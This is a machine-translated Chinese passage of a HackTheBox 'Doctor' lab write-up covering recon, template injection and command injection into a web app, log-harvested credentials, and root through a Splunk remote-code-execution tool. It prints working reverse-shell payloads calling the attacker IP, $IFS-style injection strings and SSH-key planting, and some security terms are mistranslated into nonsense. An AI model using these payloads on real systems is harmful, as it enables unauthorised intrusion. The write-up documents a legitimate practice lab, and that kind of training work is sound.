
服务器端模板注入和命令注入。
Splunk
PySplunkWhisperer2

# 健康诊断：医生

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/02/06/htb-doctor.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fdoctor-cover.) 

医生是关于攻击一个类似留言板的网站。我会在站点中发现两个漏洞，服务器端模板注入和命令注入。无论哪种方式，我返回的shell都可以访问读取日志，在那里我会找到发送到密码重置URL的密码，该密码适用于下一个用户并登录到Splunk Atom源。我将使用 Splunk 惠斯佩尔 2 来利用它来获得 RCE 和根壳。在Beyond Root中，我将查看我在盒子上找到的一个奇怪的工件，并检查两个Web漏洞的来源。

## 箱子信息

名字

[医生](https://www.hackthebox.eu/home/machines/profile/278) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-doctor.png) 

发行日期

[26 9月 2020](https://twitter.com/hackthebox_eu/status/1309129779501772801)

停用日期

06 2月 2021

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fdoctor-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fdoctor-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 36分05秒[![断续器](https://image.cubox.pro/article/2022091910535330943/81373.jpg)](https://www.hackthebox.eu/home/users/profile/77141)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 00小时 36分12秒。[![断续器](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F13569)](https://www.hackthebox.eu/home/users/profile/13569)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F94858)](https://www.hackthebox.eu/home/users/profile/94858)-

## 侦察

### n地图

`nmap`找到三个开放的 TCP 端口，即 SSH （22）、HTTP （80） 和 HTTPS/splunk （8089）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.209
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 15:09 EDT
    Nmap scan report for 10.10.10.209
    Host is up (0.014s latency).
    Not shown: 65532 filtered ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    8089/tcp open  unknown
    
    Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
    
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 15:14 EDT
    Nmap scan report for 10.10.10.209
    Host is up (0.014s latency).
    
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Doctor
    8089/tcp open  ssl/http Splunkd httpd
    | http-robots.txt: 1 disallowed entry 
    |_/
    |_http-server-header: Splunkd
    |_http-title: splunkd
    | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
    | Not valid before: 2020-09-06T15:57:27
    |_Not valid after:  2023-09-06T15:57:27
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 38.54 seconds
    

基于[开放SSH](https://packages.ubuntu.com/search?keywords=openssh-server)和[阿帕奇](https://packages.ubuntu.com/search?keywords=apache2)版本，主机可能运行的是乌班图 Focal 20.04。

### Splunkd - TCP 8089

[本页](https://www.learnsplunk.com/splunk-troubleshooting.html)提供了有关 Splunk 使用的不同 TCP 端口的详细信息。8089 是管理端口，包括公开 REST API。

访问此按钮将返回一个包含四个选项的页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201031152834778.png) 

第一个和第四个链接只是说“无效的请求”。第二和第三个链接弹出HTTP基本身份验证框。我对信誉进行了几次猜测，但没有运气。

我在Splunkd做了一个秃鹫，但没有发现任何有用的东西。谷歌搜索“Splunk 8089漏洞利用”确实发现了一些有趣的东西。[蜘蛛侠2](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)看起来可以在这里工作，但我需要信誉。一旦我有了它们，我就会回来的。`searchsploit`

### 网站 - TCP 80

该网站适用于医疗保健提供者：

[![image-20201031152607275](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201031152607275.png)](https://0xdf.gitlab.io/img/image-20201031152607275.png)

[_点击查看完整图片_](https://0xdf.gitlab.io/img/image-20201031152607275.png)

HTTP 标头显示这是在阿帕奇上运行的：

    HTTP/1.1 200 OK
    Date: Sun, 01 Nov 2020 10:23:44 GMT
    Server: Apache/2.4.41 (Ubuntu)
    Last-Modified: Sat, 19 Sep 2020 16:59:55 GMT
    ETag: "4d88-5afad8bea6589-gzip"
    Accept-Ranges: bytes
    Vary: Accept-Encoding
    Content-Length: 19848
    Connection: close
    Content-Type: text/html
    

有一个电子邮件地址 ，我没有找到太多其他与它有关的东西，但我确实添加到了我的主机文件中。`info@doctors.htb``doctors.htb`

### 医生 - TCP 80

访问将返回重定向到登录表单：：`http://doctors.htb``http://doctors.htb/login?next=%2F`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201031153416538.png) 

我注意到在HTTP标头中，此页面不是在如上所述的同一Apache服务器下提供的，而是使用Python：

    HTTP/1.1 200 OK
    Date: Sun, 01 Nov 2020 10:21:07 GMT
    Server: Werkzeug/1.0.1 Python/3.8.2
    Content-Type: text/html; charset=utf-8
    Vary: Cookie,Accept-Encoding
    Connection: close
    Content-Length: 248
    

我没有任何信誉，也没有基本的SQLi似乎有效，但有一个立即注册链接。当我完成该表单时，它会重定向回登录页面，并附上注释：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201031153543167.png) 

登录后，它会显示一个相对空的页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201101045903292.png) 

蓝色框中的 1 看起来像页码（单击它转到 ）。`/home?page=1`

“新消息”链接提供了一个表单，我可以在其中创建带有标题和内容的帖子，它现在显示在页面上：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201101050043569.png) 

在页面源代码中，导航栏中有一个注释选项，指的是：`/archive`

          <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
            <div class="container">
              <a class="navbar-brand mr-4" href="/">Doctor Secure Messaging</a>
              <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggle" aria-controls="navbarToggle" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
              </button>
              <div class="collapse navbar-collapse" id="navbarToggle">
                <div class="navbar-nav mr-auto">
                  <a class="nav-item nav-link" href="/home">Home</a>
                  <!--archive still under beta testing<a  href="/archive">Archive</a>-->
                </div>
                <!-- Navbar Right Side -->
                <div class="navbar-nav">
                  
                    <a class="nav-item nav-link" href="/post/new">New Message</a>
                    <a class="nav-item nav-link" href="/account">Account</a>
                    <a class="nav-item nav-link" href="/logout">Logout</a>
                  
                </div>
              </div>
            </div>
          </nav>
    

访问将返回有关现有帖子的 XML：

    HTTP/1.1 200 OK
    Date: Sun, 01 Nov 2020 10:05:37 GMT
    Server: Werkzeug/1.0.1 Python/3.8.2
    Content-Type: text/html; charset=utf-8
    Vary: Cookie,Accept-Encoding
    Content-Length: 157
    Connection: close
    
    
    	<?xml version="1.0" encoding="UTF-8" ?>
    	<rss version="2.0">
    	<channel>
     	<title>Archive</title>
     	<item><title>Test Post</title></item>
    	</channel>
    

我试图发送可能识别某种XXE漏洞的有效载荷，但没有发现任何有用的东西。

## 壳牌作为网络

### 通过性传播感染

#### 背景

Python Web 服务器可能容易受到服务器端模板注入的攻击。如果未清理用户输入，则可以将其包含在模板代码中，而不是作为文本进行处理，这可以允许远程执行代码。OWASP有一个[页面](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection#:~:text=Server%20Side%20Template%20Injection%20vulnerabilities,code%20execution%20on%20the%20server.)，在后台详细介绍了该页面。一个简单的例子是一个基于Python Jinja2的服务器，它具有如下路由：

    @app.route("/hello")
    def hello():
        user = request.values.get("user")
        return Jinja2.from_string(f'Hello {user}!').render()
    

如果用户提交一个像 这样的 get 请求，结果将是 ，因为函数将处理大括号内的文本。`/hello?user={{7*7}}``Hello 49!``render`

#### 性传播感染检测

有效载荷所有事物在[SSTI页面上](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology)有一个很棒的图像，显示了如何测试SSTI：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fdoctor-serverside.png) 

因此，我在标题和消息中都提交了第一个带有注入尝试的测试：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201101054424798.png) 

当帖子显示回来时，我没有看到任何注射：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201101054457363.png) 

下一个测试也失败了：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201101054536447.png) 

经过一番混乱，我又开始环顾四周，最终又回到了 ，现在有一个有趣的结果：`/archive`

    
    	<?xml version="1.0" encoding="UTF-8" ?>
    	<rss version="2.0">
    	<channel>
     	<title>Archive</title>
     	<item><title>${7*7}</title></item>
    
    			</channel>
    			<item><title>49</title></item>
    
    			</channel>
    

毕竟有性传播感染！我创建了一个标题为 的新消息，结果指向 Jinja2 或 Twig：`{{7*'7'}}`

    	<?xml version="1.0" encoding="UTF-8" ?>
    	<rss version="2.0">
    	<channel>
     	<title>Archive</title>
     	<item><title>${7*7}</title></item>
    
    			</channel>
    			<item><title>49</title></item>
    	
    			</channel>
    			<item><title>7777777</title></item>
    	
    			</channel>
    

#### 壳

我将从有效载荷中获取[RCE有效载荷](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)，并通过放入我的IP /端口来修改它，并将过程更改为获取外壳：`bash -i`

    {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.6\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
    

当我把这个作为标题，然后刷新时，我得到一个shell：`/archive`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.209.
    Ncat: Connection from 10.10.10.209:40136.
    bash: cannot set terminal process group (912): Inappropriate ioctl for device
    bash: no job control in this shell
    web@doctor:~$ id
    uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
    

### 通过命令注入

#### 列举

每当我有一个表单在页面上显示回我的表单时，最好检查用户交互（如在[SecNotes](https://0xdf.gitlab.io/2019/01/19/htb-secnotes.html#get-tylers-credentials)中）和/或跨站点脚本（XSS）。我创建了两个链接，并在正文中放置了一个脚本框：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201101100239532.png) 

我启动了一个Python网络服务器，在点击提交时，创建了帖子：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201101100337162.png) 

输入作为文本处理，而不是作为 HTML 处理。奇怪的是，我仍然在我的Web服务器上受到一次点击：

    root@kali# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.209 - - [01/Nov/2020 10:02:59] code 404, message File not found
    10.10.10.209 - - [01/Nov/2020 10:02:59] "GET /content HTTP/1.1" 404 -
    

点击提交即可立即点击。我不清楚这是模拟的用户交互，还是主机上的某种验证脚本，但值得一试。

#### 识别客户端

我杀死了Python网络服务器，并开始对整个请求有更好的感觉。我重新提交了一篇带有 正文的帖子，请求再次立即出现：`nc``http://10.10.14.6/test`

    root@kali# nc -lnvp 80
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::80
    Ncat: Listening on 0.0.0.0:80
    Ncat: Connection from 10.10.10.209.
    Ncat: Connection from 10.10.10.209:34852.
    GET /test HTTP/1.1
    Host: 10.10.14.6
    User-Agent: curl/7.68.0
    Accept: */*
    

请求挂起了一秒钟，然后返回，就像它返回一样，网页弹出了一条错误消息：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201101100729739.png) 

这看起来更像是服务器上的某种链接验证检查器，并且它正在运行curl来执行此操作（而不是python内部的本机内容）。`requests`

#### 命令注入

现在，在侦听80和侦听ICMP的情况下，我制作了我的下一个有效载荷，它返回了用户名web：`nc``tcpdump``http://10.10.14.6/$(whoami)`

    10.10.10.209 - - [01/Nov/2020 10:12:53] "GET /web HTTP/1.1" 404 -
    

如果我将命令更改为 ，我会得到第一个空格“uid=1001（web）”：`id`

    10.10.10.209 - - [01/Nov/2020 10:13:33] "GET /uid=1001(web) HTTP/1.1" 404 -
    

尝试执行更复杂的命令失败了，因为很明显添加空格会破坏事物。我尝试使用来表示空间（一种常见的注入技术），最终发现，再加上参数的组合可以使其与以下内容一起使用：`$IFS``'`

    http://10.10.14.6/$(ping$IFS-c$IFS'1'$IFS'10.10.14.6')
    

我得到一个ping：

    root@kali# tcpdump -ni tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    10:16:12.333148 IP 10.10.10.209 > 10.10.14.6: ICMP echo request, id 3, seq 1, length 64
    10:16:12.333176 IP 10.10.14.6 > 10.10.10.209: ICMP echo reply, id 3, seq 1, length 64
    

#### 壳牌通过固态混合苯

再次使用单引号需要一些尝试，但是我得到了注入，为当前用户Web编写了一个SSH密钥（我从注入中知道）。我使用的是 ed25519 密钥（因为它们真的很短）。事实证明，中没有目录，所以我需要创建一个：`whoami``.ssh``/home/web`

    http://10.10.14.6/$(mkdir$IFS'/home/web/.ssh')
    

然后我会写下我的密钥：

    http://10.10.14.6/$(echo$IFS'ssh-ed25519'$IFS'AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d'>'/home/web/.ssh/authorized_keys')
    

现在，我将连接该密钥并拥有一个 SSH 外壳：

    root@kali:/opt/privilege-escalation-awesome-scripts-suite/linPEAS# ssh -i ~/keys/ed25519_gen web@10.10.10.209
    Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    
    76 updates can be installed immediately.
    36 of these updates are security updates.
    To see these additional updates run: apt list --upgradable
    
    
    The list of available updates is more than a week old.
    To check for new updates run: sudo apt update
    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
    
    Your Hardware Enablement Stack (HWE) is supported until April 2025.
    Last login: Sun Nov  1 16:25:12 2020 from 10.10.14.6
    web@doctor:~$
    

#### 壳通过 nc.传统

如果我从连接（不是 shell）开始，它的有效负载为：`nc``http://10.10.14.6/$(nc$IFS'10.10.14.6'$IFS'443')`

    root@kali:/opt/privilege-escalation-awesome-scripts-suite/linPEAS# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.209.
    Ncat: Connection from 10.10.10.209:40418.
    

各种反向外壳不起作用。我试过，以及Bash反向炮弹，但没有成功。最终我尝试了（这就像，但会有标志），它的工作原理：`-e /bin/bash``nc``nc.traditional``nc``-e`

    http://10.10.14.6/$(nc.traditional$IFS-e$IFS'/bin/bash'$IFS'10.10.14.6'$IFS'443')
    

我得到了一个外壳：

    root@kali:/opt/privilege-escalation-awesome-scripts-suite/linPEAS# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.209.
    Ncat: Connection from 10.10.10.209:40450.
    id
    uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
    

## 谢尔 饰 肖恩

### 列举

#### 手动

作为网络，我可以看到盒子上的另一个用户，肖恩：

    web@doctor:/home$ ls
    shaun  web
    

`user.txt`在肖恩的主目录中，但我还不能读它。

网络也是adm组的成员：

    web@doctor:/home/shaun$ id
    uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
    

这很有趣，因为这意味着Web可以读取日志文件。我快速浏览了字符串的所有日志（它应该同时获得“passwd”和“密码”）：`grep``passw`

    web@doctor:/var/log$ grep -r passw . 2>/dev/null   
    ./auth.log:Nov  1 11:42:05 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
    ./auth.log:Nov  1 11:42:11 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
    ./auth.log:Nov  1 11:42:20 doctor VGAuth[669]: message repeated 20 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
    ./auth.log:Nov  1 11:42:37 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
    ./auth.log:Nov  1 11:42:50 doctor VGAuth[669]: message repeated 15 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
    ./auth.log:Nov  1 11:42:51 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
    ./auth.log:Nov  1 11:42:52 doctor VGAuth[669]: message repeated 7 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
    ./auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
    ./auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
    ./auth.log.1:Nov  1 11:42:04 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
    ./auth.log.1:Nov  1 11:42:04 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
    ./apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
    Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
    Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001@8612c285930942bc8295a5e5404c6fb7-000000000000d0e1-0005ae7b997ca2d8.journal matches
    Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-000000000000cf5a-0005ae7b98c1acfe.journal matches
    Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000003ac7-0005ab70dc697773.journal matches
    Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/user-1002@84e1503b20fd49eca2b6ca0b7d6fdeeb-00000000000176d6-0005af5694057aa6.journal matches
    Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000033c8f-0005afad8045c159.journal matches
    

来自阿帕奇日志的这一行很有趣：

    ./apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
    

“Guitar123”看起来不像一个电子邮件地址。它看起来像一个密码。

#### 林皮亚斯

如果我没有手动检查，[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)也会为我找到这个。我将从主机上的Python Web服务器托管它：

    root@kali:/opt/privilege-escalation-awesome-scripts-suite/linPEAS# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    

现在从我的Web shell中，我可以下载它，使其可执行并运行它：

    web@doctor:/dev/shm$ wget 10.10.14.6/linpeas.sh                                                                                                                                                           
    --2020-11-01 12:23:16--  http://10.10.14.6/linpeas.sh                                                                                                                                                     Connecting to 10.10.14.6:80... connected.                                                                                                                                                                 
    HTTP request sent, awaiting response... 200 OK                                                       
    Length: 159864 (156K) [text/x-sh]                                                                                                                                                                         
    Saving to: ‘linpeas.sh’                                                                                                                                                                                   
                                                                                                                                                                                                              
    linpeas.sh          100%[===================>] 156,12K  --.-KB/s    in 0,06s                                                                                                                              
                                                                                                                                                                                                              2020-11-01 12:23:16 (2,69 MB/s) - ‘linpeas.sh’ saved [159864/159864]                                                                                                                                      
                                                                                                         
    web@doctor:/dev/shm$ chmod +x ./linpeas.sh                                                                                                                                                                web@doctor:/dev/shm$ ./linpeas.sh
    ...[snip]...
    

密码出现在“在日志中查找密码”部分：

    [+] Finding passwords inside logs (limit 70)
    Binary file /var/log/apache2/access.log.12.gz matches
    Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
    Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001.journal matches
    Binary file /var/log/kern.log.2.gz matches
    Binary file /var/log/kern.log.4.gz matches
    Binary file /var/log/syslog.4.gz matches
    /var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
    /var/log/auth.log.1:Nov  1 11:42:04 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
    /var/log/auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2                      
    /var/log/auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
    

### 苏

原来吉他123是肖恩的密码：

    web@doctor:/var/log$ su - shaun
    Password: 
    shaun@doctor:~$
    

现在我可以访问：`user.txt`

    shaun@doctor:~$ cat user.txt
    4300eefd************************
    

## 外壳作为根

### 列举

想起上面的斯普伦克特权，我回到了斯普伦克页面，在HTTP基本身份验证中尝试了肖恩的信誉，它的工作原理。现在还有更多功能：

[![image-20201101061303774](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201101061303774.png)](https://0xdf.gitlab.io/img/image-20201101061303774.png)

[_点击查看完整图片_](https://0xdf.gitlab.io/img/image-20201101061303774.png)

### 断续器

我跑去获取本地存储库的副本，然后决定尝试使用简单的测试漏洞。我开始，然后运行漏洞利用：`git clone https://github.com/cnotin/SplunkWhisperer2.git``ping``tcpdump`

    root@kali:/opt/SplunkWhisperer2/PySplunkWhisperer2# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload "ping -c 1 10.10.14.6"
    Running in remote mode (Remote Code Execution)
    [.] Authenticating...
    [+] Authenticated
    [.] Creating malicious app bundle...
    [+] Created malicious app bundle in: /tmp/tmpwvtxfq84.tar
    [+] Started HTTP server for remote mode
    [.] Installing app from: http://10.10.14.6:8181/
    10.10.10.209 - - [01/Nov/2020 06:15:40] "GET / HTTP/1.1" 200 -
    [+] App installed, your code should be running now!
    
    Press RETURN to cleanup
    

在 ，我得到了一个电话：`tcpdump`

    root@kali# tcpdump -ni tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    06:15:40.494671 IP 10.10.10.209 > 10.10.14.6: ICMP echo request, id 1, seq 1, length 64
    06:15:40.494729 IP 10.10.14.6 > 10.10.10.209: ICMP echo reply, id 1, seq 1, length 64
    

我在漏洞利用窗口中按回车键，它被清理干净了。

### 壳

现在，我将启动并将有效负载从 更改为反向外壳：`nc``ping`

    root@kali:/opt/SplunkWhisperer2/PySplunkWhisperer2# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"
    Running in remote mode (Remote Code Execution)
    [.] Authenticating...
    [+] Authenticated
    [.] Creating malicious app bundle...
    [+] Created malicious app bundle in: /tmp/tmpceoe88rl.tar
    [+] Started HTTP server for remote mode
    [.] Installing app from: http://10.10.14.6:8181/
    10.10.10.209 - - [01/Nov/2020 06:17:57] "GET / HTTP/1.1" 200 -
    [+] App installed, your code should be running now!
    
    Press RETURN to cleanup
    
    [.] Removing app...
    [+] App removed
    [+] Stopped HTTP server
    Bye!
    

在连接的根壳上：`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.209.
    Ncat: Connection from 10.10.10.209:40142.
    bash: cannot set terminal process group (1140): Inappropriate ioctl for device
    bash: no job control in this shell
    root@doctor:/# 
    

我可以抓住：`root.txt`

    root@doctor:/root# cat root.txt
    fba452cc************************
    

## 超越根

### 剩余伪影

在《医生》上工作时，我有一个有趣的经历，并设法（在Jkr的一些帮助下）弄清楚发生了什么。

#### 情况

如果我在第一次重置数据库后在网页上创建一个帐户，然后重置该框，一旦出现该框，如果我刷新主页，我得到这个：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20201108113043144.png) 

我看到肖恩的一篇帖子，显然是试图利用盒子上的漏洞。但是，为什么我以 shaun 的身份登录？这个干净盒子上的帖子是什么？为了显示正在发生的事情，我需要显示：

*   如何每 20 分钟清除一次数据库;
*   烧瓶饼干的工作原理;
*   处于 VM 的已提交/重置状态的数据库状态。

#### 数据库清理

当我注册一个帐户时，它警告我该帐户只会持续20分钟。有了根壳，我可以看到有一个cron在运行：

    root@doctor:~# crontab -l
    ...[snip]...
    # m h  dom mon dow   command
    */20 * * * * /opt/clean/cleandb.py
    

此 Python 脚本删除文件，将干净的版本复制到适当的位置，并设置权限：`site.db`

    #!/usr/bin/env python3
    import os
    
    os.system('rm /home/web/blog/flaskblog/site.db')
    os.system('cp /opt/clean/site.db /home/web/blog/flaskblog/site.db')
    os.system('chown web:web /home/web/blog/flaskblog/site.db')
    

#### 烧瓶饼干

该网站设置了一个如下所示的 Cookie：

    Cookie: session=.eJwtjkFqQzEMRO_idRa2JEtyLvOxLJmWQAv_J6uQu1eLMpuZYRjeuxz7jOur3J_nK27l-PZyL1BblTqJ91joC5itQnXrG8h9g8Pw0aRWFlWLdJKLaQuJPabadMs0oqGzo3cOElsurqA2cMkU64bks6kLGSmHSOurpoJLgryuOP9pMq7r3Mfz9xE_WSRafusw2mir0UQ1wOYN8t37sBDaGrN8_gBAKECD.X6gfcQ.mfT1KVEf-UInckjFQhj7lNyoCNA
    

起初我以为这是一个JWT，但事实并非如此，[这个网站](https://www.kirsle.net/wizards/flask-session.cgi)将解码Flask cookie（注意，你可以解码，但你不能在没有签名机密的情况下修改）：

    {
        "_fresh": true,
        "_id": "201070a46f9c3dc266b020db5f24ddf2d29d917006788be17076b0abc346dea8badbabc9e13d6d3d56e47bcd7d828b93c7a7b5b34da18d74b486e7715c0c0ce6",
        "_user_id": "2",
        "csrf_token": "70ac9e89b4f3bc14a38b231d1228bd59be74f8ea"
    }
    

查看源代码，似乎就是从此 cookie 中读取的内容，然后用于从数据库中获取用户：`user_id`

        @staticmethod
        def verify_reset_token(token):
            s = Serializer(current_app.config['SECRET_KEY'])
            try:
                user_id = s.loads(token)['user_id']
            except:
                return None
            return User.query.get(user_id)    
    

因此，如果我能够在盒子重置（或数据库清除）时保留有效的cookie，我就可以成为另一个用户。这似乎不太可能出现在现实世界的系统中，但会在像HTB这样的CTF上一直出现。

#### 数据库冻结状态

我在重置后从工作站点目录中删除了的副本。在此数据库中，有两个用户：`site.db`

    root@kali# sqlite3 site.db 
    SQLite version 3.33.0 2020-08-14 13:23:32
    Enter ".help" for usage hints.
    sqlite> select * from user;
    1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
    2|shaun|s@s.com|default.gif|$2b$12$wW0SocwtbEImnxgWoHJPMOzbTKs1qYCeE5Q0KnBtCXqD7NzuDne4y
    

还有与用户 ID 2 关联的漏洞利用帖子：

    sqlite> select * from post;
